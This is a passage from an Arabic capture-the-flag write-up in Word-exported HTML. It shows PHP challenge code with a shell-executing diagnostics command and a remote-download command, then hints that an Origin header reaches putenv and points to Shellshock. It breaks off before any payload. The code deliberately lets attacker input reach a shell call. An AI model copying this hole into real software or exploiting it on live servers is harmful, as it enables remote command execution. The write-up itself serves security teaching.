+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$c&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>=&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>explode</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;&nbsp;&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>,&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$command</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$c</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>0</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'>])&nbsp;{</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;info&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>:</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>nl2br</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;\nYour&nbsp;IP:&nbsp;&quot;&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#0000BB'>$_SERVER</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>[</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#DD0000'>'REMOTE_ADDR'</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>]);</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>nl2br</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;\nYour&nbsp;Tempdir:&nbsp;&quot;&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#0000BB'>$_SESSION</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>[</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#DD0000'>&quot;dir&quot;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>]);</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;diag&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>:</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>enable_diagnostics</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>();</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>nl2br</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>shell_exec_getresults</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>(</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#DD0000'>&quot;./dig&quot;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>));</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;download&quot;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>:</span></code><span style='font-size:14.0pt;line-height:115%;
+  font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$data&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>=&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>file_get_contents</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$c</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>1</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'>]);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>file_put_contents</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_SESSION</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>'dir'</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]&nbsp;.&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;/&quot;&nbsp;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>.&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>basename</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$c</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>2</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'>]),&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$data</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;Downloaded&nbsp;file&nbsp;to&nbsp;&quot;&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#0000BB'>$_SESSION</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>[</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#DD0000'>&quot;dir&quot;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>]&nbsp;.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#DD0000'>&quot;/&quot;&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#0000BB'>basename</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>(</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#0000BB'>$c</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>[</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#0000BB'>2</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>]);</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;list&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>:</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>listDir</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_SESSION</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;dir&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;destroy&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>:</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>session_destroy</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>();</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;source&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>:</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>highlight_file</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>__file__</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;</span></code><br>
+  <br>
+  </span><code><span style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>?&gt;</span></code></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal align=right style='text-align:right;line-height:115%'><b><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;background:yellow'>HINT #1</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>حاول أن تفهم عمل الدالة </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#0000BB'>enable_diagnostics</span></b><b><span dir=LTR style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>()</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:black'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>ماذا تفعل  الدالة </span><b><span lang=EN-GB
+dir=LTR style='font-size:14.0pt;line-height:115%;color:#0000BB'>enable_diagnostics</span></b><b><span
+lang=EN-GB dir=LTR style='font-size:14.0pt;line-height:115%;color:#007700'>()</span></b><span
+dir=RTL></span><b><span lang=EN-GB style='font-size:14.0pt;line-height:115%;
+color:#007700'><span dir=RTL></span> </span></b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;color:black'>بإختصار؟</span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><code><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span></code><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'>تقوم بنداء الدالة </span><code><span lang=EN-GB dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#0000BB'>putenv</span></code><code><span lang=EN-GB dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#007700'>() </span></code><span dir=RTL></span><code><span lang=EN-GB
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#007700'><span dir=RTL></span> </span></code><code><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>والتي تقوم بدورها بإستناد قيمة <b>لمتغير ما</b> </span></code></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><code><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span></code><span
+dir=RTL></span><code><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>اطلع على هذا المرجع لفهم عمل
+الدالة: </span></code></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=EN-GB
+style='font-size:14.0pt;line-height:115%'><a
+href="https://www.php.net/manual/en/function.putenv.php"><span dir=LTR>https://www.php.net/manual/en/function.putenv.php</span></a></span></p>
+
+<p class=MsoNormal dir=RTL style='margin-right:18.0pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:#007700'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد الاطلاع على المرجع
+السابق، يبدو بأن الدالة تقوم بإسناد قيمة لــ </span><span class=dc-title><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif'>environment
+variable</span></span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span class=dc-title><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif'>وبعد تحليل الـ </span></span><span
+class=dc-title><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif'>Parameter</span></span><span dir=RTL></span><span
+class=dc-title><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif'><span dir=RTL></span> التي تُمرر للدالة،
+نلاحظ أنه يوجد </span></span><span class=dc-title><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif'>Parameter
+</span></span><span dir=RTL></span><span class=dc-title><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif'><span
+dir=RTL></span> نستطيع تمرير قيمة له ، عن طريق الـ </span></span><span
+class=dc-title><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif'>Origin </span></span><span dir=RTL></span><span
+class=dc-title><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif'><span dir=RTL></span> في الـ </span></span><span
+class=dc-title><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif'>HTTP Request </span></span><span dir=RTL></span><span
+class=dc-title><span style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif'><span
+dir=RTL></span> </span></span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR></span><span lang=AR-SA dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=LTR></span> </span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>نتوقف هنا
+للحظة ؟ ألا تبدو بأنها ثغرة </span><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>Shellshock  </span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> ؟ </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>من هنا بدأت أختبر إسناد قيم
+للمتغير </span><span dir=LTR style='font-size:14.0pt;line-height:115%;
